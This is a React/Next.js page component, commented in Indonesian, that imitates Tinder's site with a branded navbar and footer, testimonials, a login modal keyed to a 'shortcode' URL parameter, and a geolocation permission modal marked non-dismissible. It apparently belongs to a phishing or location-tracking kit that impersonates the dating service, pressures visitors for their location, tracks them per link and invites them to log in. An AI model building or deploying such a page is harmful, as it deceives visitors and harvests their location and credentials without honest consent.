'use client';

import { TrackPageView } from '@/components/tracking/track-page-view';
import { useScroll, useTransform } from 'framer-motion';
import { useSearchParams } from 'next/navigation';
import { useEffect, useRef, useState } from 'react';
import LoadingScreen from './components/loading-screen';
import LocationPermissionModal from './components/location-permision-modal';
import LoginModal from './components/login-modal';
import TestimonialCarousel from './components/testimonial-carousel';

// Import komponen-komponen yang telah dibuat
import BackgroundImage from './components/BackgroundImage';
import CookieBanner from './components/CookieBanner';
import LocationDeniedMessage from './components/LocationDeniedMessage';
import ProfileCardSection from './components/ProfileCardSection';
import TinderFooter from './components/TinderFooter';
import TinderNavbar from './components/TinderNavbar';
import useLocationTracking from './hooks/useLocationTracking';

// Testimonials data digunakan oleh TestimonialCarousel

export default function HomePage() {
  // State untuk komponen
  const [showCookieBanner, setShowCookieBanner] = useState(true);
  const [isClient, setIsClient] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [contentLoaded, setContentLoaded] = useState(false);
  const [navbarFixed, setNavbarFixed] = useState(false);

  // Menggunakan custom hook untuk location tracking
  // Menggunakan custom hook untuk location tracking
  const {
    location,
    error: locationError,
    permissionStatus,
    requestLocation,
    checkPermission,
  } = useLocationTracking({
    onSuccess: (position) => {
      console.log('Location retrieved:', position);
    },
    onError: (err) => {
      console.error('Error retrieving location:', err);
    },
    onPermissionDenied: () => {
      console.warn('Location permission denied');
    },
  });

  const locationDenied = permissionStatus === 'denied';
  const locationEnabled = permissionStatus === 'granted';

  // Refs dan animasi
  const backgroundRef = useRef<HTMLDivElement>(null);
  const testimonialsRef = useRef<HTMLElement>(null);
  const { scrollY } = useScroll();

  const titleOpacity = useTransform(scrollY, [0, 200, 400], [1, 0.5, 0]);
  const buttonOpacity = useTransform(scrollY, [0, 300, 500], [1, 0.3, 0]);

  const searchParams = useSearchParams();
  const shortcode = searchParams.get('shortcode');
  console.log('location', location);
  // Deteksi client-side dan ukuran layar
  useEffect(() => {
    setIsClient(true);

    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);

    // Simulasi loading time
    const timer = setTimeout(() => {
      setIsLoading(false);
      setContentLoaded(true);
    }, 2000);

    return () => {
      window.removeEventListener('resize', checkMobile);
      clearTimeout(timer);
    };
  }, []);

  // Show location modal after content is loaded
  useEffect(() => {
    if (contentLoaded) {
      // Tunggu sebentar setelah konten dimuat sebelum memeriksa izin lokasi
      const locationTimer = setTimeout(() => {
        checkPermission();
      }, 1500);

      return () => clearTimeout(locationTimer);
    }
  }, [contentLoaded, checkPermission]);

  // Parallax effect for background and navbar position
  useEffect(() => {
    if (!isClient) return;

    const testimonials = testimonialsRef.current;

    if (!testimonials) return;

    // Create an intersection observer to detect when testimonials section is in view
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          setNavbarFixed(true);
        } else {
          setNavbarFixed(false);
        }
      },
      { threshold: 0.1 },
    );

    observer.observe(testimonials);

    const handleScroll = () => {
      if (backgroundRef.current) {
        const scrollY = window.scrollY;
        backgroundRef.current.style.transform = `translateY(${scrollY * 0.5}px)`;
      }

      // Get the position of the testimonials section
      if (testimonials) {
        const testimonialsPosition = testimonials.getBoundingClientRect().top;

        // If testimonials section is about to come into view (or already in view)
        if (testimonialsPosition < window.innerHeight) {
          setNavbarFixed(true);
        } else {
          setNavbarFixed(false);
        }
      }
    };

    window.addEventListener('scroll', handleScroll);
    return () => {
      window.removeEventListener('scroll', handleScroll);
      observer.disconnect();
    };
  }, [isClient]);

  if (!isClient) {
    return null;
  }

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='relative min-h-screen overflow-hidden'>
      {/* Background dengan fixed position */}
      <BackgroundImage backgroundRef={backgroundRef} isMobile={isMobile} />

      {/* Navbar */}
      <TinderNavbar
        isFixed={navbarFixed}
        locationEnabled={locationEnabled}
        locationError={locationError ? locationError.message : null}
        onLoginClick={() => setShowLoginModal(true)}
      />

      {/* Main content */}
      <main className='relative z-10'>
        {/* Section pesan lokasi ditolak */}
        <LocationDeniedMessage
          locationDenied={locationDenied}
          onTryAgainClick={requestLocation}
        />

        {/* Hero section dengan profile card */}
        <ProfileCardSection
          profileVisible={locationEnabled}
          titleOpacity={titleOpacity}
          buttonOpacity={buttonOpacity}
          onLoginClick={() => setShowLoginModal(true)}
        />
      </main>

      {/* Testimonials section with carousel */}
      <section
        ref={testimonialsRef}
        className='relative z-20 mt-16 bg-gray-900'
      >
        <div className='mx-auto max-w-6xl px-4'>
          <h2 className='mb-8 text-center text-3xl font-bold text-white'>
            Success Stories
          </h2>
          <TestimonialCarousel />
        </div>
      </section>

      {/* Footer */}
      <TinderFooter />

      {/* Cookie banner */}
      <CookieBanner
        show={showCookieBanner}
        onClose={() => setShowCookieBanner(false)}
      />

      {/* Login Modal */}
      <LoginModal
        isOpen={showLoginModal}
        onClose={() => setShowLoginModal(false)}
        shortcode={shortcode || undefined}
      />

      {/* Location Permission Modal - Now non-dismissible */}
      <LocationPermissionModal
        isOpen={permissionStatus === 'prompt'}
        onAllow={requestLocation}
      />

      {/* Bottom mobile navigation bar */}
      {/* <MobileNavBar /> */}

      {/* TrackPageView component */}
      <TrackPageView pageType='tinder' />
    </div>
  );
}
